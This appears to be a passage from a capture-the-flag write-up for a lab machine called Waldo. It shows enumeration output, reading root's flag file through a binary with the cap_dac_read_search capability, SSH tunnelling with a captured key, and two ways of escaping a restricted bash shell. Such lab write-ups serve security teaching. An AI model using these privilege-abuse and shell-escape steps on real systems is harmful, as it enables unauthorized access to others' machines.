UUID=47b998e6-5a96-4881-93b2-85013d9275a0 /               ext4    errors=remount-ro 0       1
# swap was on /dev/sda5 during installation
UUID=9cf50e3c-e253-439b-8196-04867bf60ef0 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 2792 Jul 24 05:50 /etc/sysctl.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 7431 May  1  2018 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 9 Aug  7  2006 /etc/host.conf
-rw-r--r-- 1 root root 346 Nov 30  2016 /etc/discover-modprobe.conf
-rw-r--r-- 1 root root 3173 Mar  2  2018 /etc/reportbug.conf
-rw-r--r-- 1 root root 60 Jul 23 10:14 /etc/resolv.conf
-rw-r--r-- 1 root root 1963 Jan 18  2017 /etc/rsyslog.conf
-rw-r--r-- 1 root root 497 Dec 31  2017 /etc/nsswitch.conf
-rw-r--r-- 1 root root 2969 May 21  2017 /etc/debconf.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 4781 Jan 24  2017 /etc/hdparm.conf
-rw-r--r-- 1 root root 191 Apr 12  2017 /etc/libaudit.conf
-rw-r--r-- 1 root root 2981 May  1  2018 /etc/adduser.conf
-rw-r--r-- 1 root root 2584 Aug  1  2016 /etc/gai.conf
-rw-r--r-- 1 root root 599 May  5  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 144 May  1  2018 /etc/kernel-img.conf
-rw-r--r-- 1 root root 552 May 27  2017 /etc/pam.conf
-rw-r--r-- 1 root root 973 Jan 31  2017 /etc/mke2fs.conf
-rw-r--r-- 1 root root 604 Jun 26  2016 /etc/deluser.conf
-rw-r--r-- 1 root root 34 Apr  9  2017 /etc/ld.so.conf


[-] Current user's history files:
lrwxrwxrwx 1 root root 9 Jul 24 07:58 /home/monitor/.bash_history -> /dev/null


[-] Location and contents (if accessible) of .bash_history file(s):
/home/monitor/.bash_history


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 May  1  2018 .
drwxr-xr-x 11 root root 4096 May  1  2018 ..


[+] Looks like we're hosting Docker:
Docker version 18.04.0-ce, build 3d479c0


### SCAN COMPLETE ####################################
monitor@waldo:~$
```

```sh
[+] Files with POSIX capabilities set:
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei


[+] Users with specific POSIX capabilities:
cap_dac_read_search monitor


[+] Capabilities associated with the current user:
cap_dac_read_search


[+] Files with the same capabilities associated with the current user (You may want to try abusing those capabilties):
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei


[+] Permissions of files with the same capabilities associated with the current user:
-rwxr-xr-x 1 root root 39752 Feb 22  2017 /usr/bin/tac
-r-xr-x--- 1 app-dev monitor 13706 May  3  2018 /home/monitor/app-dev/v0.1/logMonitor-0.1
```

```sh
monitor@waldo:~$ man capabilities
```

![](images/16.png)

![](images/17.png)

```sh
monitor@waldo:~$ cd /root
bash: cd: /root: Permission denied
monitor@waldo:~$
```

```sh
monitor@waldo:~$ /usr/bin/tac /root/root.txt
8fb67c84418be6e45fbd348fd4584f6c
monitor@waldo:~$
```

###### Escape rBash and setup a SSH Tunnel

- **`SSH Tunnel`**

![](images/18.png)

```sh
root@kali:~/waldo# ssh -L8022:127.0.0.1:22 -i nobody.ssh nobody@10.10.10.87
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.
waldo:~$
```

```sh
root@kali:~/waldo# netstat -anlp | grep 8022
tcp        0      0 127.0.0.1:8022          0.0.0.0:*               LISTEN      3833/ssh
tcp6       0      0 ::1:8022                :::*                    LISTEN      3833/ssh
root@kali:~/waldo#
```

```sh
root@kali:~/waldo# nc 10.10.10.87 22
SSH-2.0-OpenSSH_7.5
^C
root@kali:~/waldo#
```

- **`Escape rBash - Method 1`**

```sh
root@kali:~/waldo# ssh -p 8022 -i nobody.ssh monitor@localhost
The authenticity of host '[localhost]:8022 ([::1]:8022)' can't be established.
ECDSA key fingerprint is SHA256:YHb7KyiwRxyN62du1P80KmeA9Ap50jgU6JlRaXThs/M.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[localhost]:8022' (ECDSA) to the list of known hosts.
Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64
           &.
          @@@,@@/ %
       #*/%@@@@/.&@@,
   @@@#@@#&@#&#&@@@,*%/
   /@@@&###########@@&*(*
 (@################%@@@@@.     /**
 @@@@&#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/
 %@@@@%##########&@@@....                 .#%#@@@@@@@#
 @@&%#########@@@@/                        */@@@%(((@@@%
    @@@#%@@%@@@,                       *&@@@&%(((#((((@@(
     /(@@@@@@@                     *&@@@@%((((((((((((#@@(
       %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&#,
          %@*(@#%@.,       /@@@@&(((((((((((((((&@@@@@@&#######%%@@@@#    &
        *@@@@@#        .&@@@#(((#(#((((((((#%@@@@@%###&@@@@@@@@@&%##&@@@@@@/
       /@@          #@@@&#(((((((((((#((@@@@@%%%%@@@@%#########%&@@@@@@@@&
      *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&@@@@@@@&
      %@/ .&%@@%#(((((((((((((((#@@@@@@@&#####%@@@%#############%@@@&%##&@@/
      @@@@@@%(((((((((((##(((@@@@&%####%@@@%#####&@@@@@@@@@@@@@@@&##&@@@@@@@@@/
     @@@&(((#((((((((((((#@@@@@&@@@@######@@@###################&@@@&#####%@@*
     @@#(((((((((((((#@@@@%&@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@
     *@@%((((((((#@@@@@@@%#&@@,,.,,.&@@@#####################%@@@@@@%######&@@.
       @@@#(#&@@@@@&##&@@@&#@@/,,,,,,,,@@@&######&@@@@@@@@&&%######%@@@@@@@@@@@
        @@@@@@&%&@@@%#&@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&@@%&@@@@@@&%#####%@@@@.
          .@@@###&@@@%%@(,,,%@&,.,,,,,,,,,,,,,.*&@@@@&(,*@&#@%%@@@@@@@@@@@@*
            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&@@@@(&@&@&@@@@(
            .@@&##@@,,/@@@@&(.  .&@@@&,,,.&@@/         #@@%@@@@@&@@@/
           *@@@@@&@@.*@@@          %@@@*,&@@            *@@@@@&.#/,@/
          *@@&*#@@@@@@@&     #@(    .@@@@@@&    ,@@@,    @@@@@(,@/@@
          *@@/@#.#@@@@@/    %@@@,   .@@&%@@@     &@&     @@*@@*(@@#
           (@@/@,,@@&@@@            &@@,,(@@&          .@@%/@@,@@
             /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#
               %@@.%@&,(@@@@,  /&@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,
                ,@@,&@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&@
                 &@,*@@.,,,,,..,,,,&@@%/**/@@*,,,,,&(.,,,.@@,,@@
                 /@%,&@/,,,,/@%,,,,,*&@@@@@#.,,,,,.@@@(,,(@@@@@(
                  @@*,@@,,,#@@@&*..,,,,,,,,,,,,/@@@@,*(,,&@/#*
                  *@@@@@(,,@*,%@@@@@@@&&#%@@@@@@@/,,,,,,,@@
                       @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&@,
                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@
                        &@&,,,,,,,,,,,,,,,,,,,,,,,,,,,,&@#
                         %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@
                         ,@@,,,,,,,,@@@&&&%&@,,,,,..,,@@,
                          *@@,,,,,,,.,****,..,,,,,,,,&@@
                           (@(,,,.,,,,,,,,,,,,,,.,,,/@@
                           .@@,,,,,,,,,,,,,...,,,,,,@@
                            ,@@@,,,,,,,,,,,,,,,,.(@@@
                              %@@@@&(,,,,*(#&@@@@@@,

                            Here's Waldo, where's root?
Last login: Wed Jan  2 19:03:00 2019 from 127.0.0.1
-rbash: alias: command not found
monitor@waldo:~$
monitor@waldo:~$ echo $PATH
/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
monitor@waldo:~$
monitor@waldo:~$ bash
-rbash: bash: command not found
monitor@waldo:~$
monitor@waldo:~$ exit
logout
-rbash: dircolors: command not found
-rbash: alias: command not found
-rbash: .: /usr/share/bash-completion/bash_completion: restricted
-rbash: PATH: readonly variable
Connection to localhost closed.
root@kali:~/waldo#
```

```sh
root@kali:~/waldo# ssh -p 8022 -i nobody.ssh monitor@localhost "echo $PATH"
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
root@kali:~/waldo#
```

```sh
root@kali:~/waldo# ssh -p 8022 -i nobody.ssh monitor@localhost bash
id
uid=1001(monitor) gid=1001(monitor) groups=1001(monitor)
python -c 'import pty; pty.spawn("/bin/bash")'
monitor@waldo:~$ ^Z
[1]+  Stopped                 ssh -p 8022 -i nobody.ssh monitor@localhost bash
root@kali:~/waldo# 
```

[`Upgrading simple shells to fully interactive TTYs`](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys)

```sh
root@kali:~/waldo# echo $TERM
xterm-256color
root@kali:~/waldo# stty -a
speed 38400 baud; rows 51; columns 101; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?; swtch = <undef>;
start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O;
min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel
iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho
-extproc
root@kali:~/waldo# stty raw -echo
root@kali:~/waldo# ssh -p 8022 -i nobody.ssh monitor@localhost bash
                                                                   reset
bash: reset: command not found
monitor@waldo:~$
monitor@waldo:~$ export SHELL=bash
monitor@waldo:~$ export TERM=xterm256-color
monitor@waldo:~$ stty rows 51 columns 101
bash: stty: command not found
monitor@waldo:~$
```

- **``Escape rBash - Method 2``**

```sh
root@kali:~/waldo# ssh -t -p 8022 -i nobody.ssh monitor@localhost bash
monitor@waldo:~$ echo $PATH
/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
monitor@waldo:~$
monitor@waldo:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
monitor@waldo:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
monitor@waldo:~$
```